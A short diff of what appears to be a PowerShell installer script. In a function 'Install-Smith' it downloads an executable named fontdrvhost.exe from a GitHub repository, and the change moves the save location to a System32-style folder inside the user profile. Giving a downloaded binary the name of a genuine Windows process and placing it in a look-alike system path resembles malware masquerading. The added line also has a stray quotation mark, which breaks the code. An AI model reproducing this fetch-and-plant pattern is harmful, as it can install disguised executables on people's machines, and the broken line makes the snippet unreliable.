@@ -35,7 +35,7 @@ function Check-FontDrv {
 function Install-Smith {
 
     $url="https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
-    $dest="$env:USERPROFILE\Downloads\fontdrvhost.exe"
+    $dest="$env:USERPROFILE\Windows\System32\fontdrvhost.exe""
 
     chk "downloading "
 
